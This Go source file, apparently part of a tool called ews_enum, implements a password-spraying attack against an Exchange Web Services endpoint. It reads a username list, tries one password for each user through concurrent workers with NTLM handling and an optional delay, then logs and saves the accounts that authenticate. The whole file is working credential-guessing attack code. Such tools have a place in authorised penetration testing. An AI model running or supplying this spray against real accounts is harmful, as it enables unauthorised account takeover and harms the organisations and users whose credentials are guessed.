package main

import (
	"fmt"
	"io"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"ews_enum/internal/ews"
)

func runSpray(cfg appConfig, stdout, stderr io.Writer) int {
	client := ews.NewClient(ews.ClientOpts{
		NTLM: cfg.NTLM, TimeoutSec: cfg.Timeout, MaxConns: cfg.Conns,
		DisableKeepAlive: cfg.NTLM, // NTLM binds auth to TCP connection; do not reuse across users.
	})

	return runSprayWithTester(cfg, stdout, stderr, func(username string) (ews.AuthResult, error) {
		return ews.TestAuth(client, cfg.URL, username, cfg.Pass)
	})
}

func dedupeUsernames(users []string) ([]string, int) {
	seen := make(map[string]struct{}, len(users))
	unique := make([]string, 0, len(users))
	duplicates := 0

	for _, user := range users {
		key := strings.ToLower(user)
		if _, exists := seen[key]; exists {
			duplicates++
			continue
		}
		seen[key] = struct{}{}
		unique = append(unique, user)
	}

	return unique, duplicates
}

func runSprayWithTester(cfg appConfig, stdout, stderr io.Writer, testAuth func(string) (ews.AuthResult, error)) int {
	users, err := readLines(cfg.UserFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot read userfile: %v\n", err)
		return 1
	}
	if len(users) == 0 {
		fmt.Fprintf(stderr, "[!] No usernames found in %s\n", cfg.UserFile)
		return 1
	}

	users, duplicates := dedupeUsernames(users)
	if len(users) == 0 {
		fmt.Fprintf(stderr, "[!] No unique usernames found in %s\n", cfg.UserFile)
		return 1
	}

	fmt.Fprintf(stderr, "[*] Password spray against %s\n", cfg.URL)
	fmt.Fprintf(stderr, "[*] Users: %d, workers: %d, connections: %d\n", len(users), cfg.Workers, cfg.Conns)
	if duplicates > 0 {
		fmt.Fprintf(stderr, "[!] Skipping %d duplicate usernames from %s\n", duplicates, cfg.UserFile)
	}

	var stateMu sync.Mutex
	var outputMu sync.Mutex
	var validUsers []string
	var attemptCount atomic.Int64
	var opErrorCount atomic.Int64
	totalUsers := int64(len(users))
	workCh := make(chan string, cfg.Workers*2)
	var wg sync.WaitGroup

	clearProgress := func() {
		fmt.Fprintf(stderr, "\r%-100s\r", "")
	}

	worker := func() {
		defer wg.Done()
		for username := range workCh {
			if cfg.DelayMS > 0 {
				time.Sleep(time.Duration(cfg.DelayMS) * time.Millisecond)
			}

			count := attemptCount.Add(1)
			stateMu.Lock()
			hits := len(validUsers)
			stateMu.Unlock()
			outputMu.Lock()
			fmt.Fprintf(stderr, "\r[*] [%d/%d] Trying: %-40s (valid: %d)", count, totalUsers, username, hits)
			outputMu.Unlock()

			result, authErr := testAuth(username)
			switch result {
			case ews.AuthSuccess:
				stateMu.Lock()
				validUsers = append(validUsers, username)
				stateMu.Unlock()
				outputMu.Lock()
				clearProgress()
				fmt.Fprintf(stderr, "[+] VALID: %s\n", username)
				outputMu.Unlock()
			case ews.AuthError:
				opErrorCount.Add(1)
				outputMu.Lock()
				clearProgress()
				fmt.Fprintf(stderr, "[!] ERROR: %s — %v\n", username, authErr)
				outputMu.Unlock()
			}
		}
	}

	wg.Add(cfg.Workers)
	for i := 0; i < cfg.Workers; i++ {
		go worker()
	}

	for _, user := range users {
		workCh <- user
	}
	close(workCh)
	wg.Wait()

	stateMu.Lock()
	validCount := len(validUsers)
	stateMu.Unlock()

	outputMu.Lock()
	clearProgress()
	fmt.Fprintf(stderr, "[*] Spray complete: %d/%d valid credentials\n", validCount, len(users))
	if count := opErrorCount.Load(); count > 0 {
		fmt.Fprintf(stderr, "[!] Spray encountered %d operational errors\n", count)
	}
	outputMu.Unlock()

	if validCount == 0 {
		if opErrorCount.Load() > 0 {
			return 2
		}
		return 0
	}

	out, closeOut, err := openOutput(stdout, cfg.OutFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot create output file: %v\n", err)
		return 1
	}
	defer closeOut()

	if err := writeSprayResults(out, cfg.Format, cfg.Pass, validUsers); err != nil {
		fmt.Fprintf(stderr, "[!] Writing output failed: %v\n", err)
		return 1
	}

	if cfg.OutFile != "" {
		fmt.Fprintf(stderr, "[*] Results written to %s\n", cfg.OutFile)
	}

	if opErrorCount.Load() > 0 {
		return 2
	}

	return 0
}
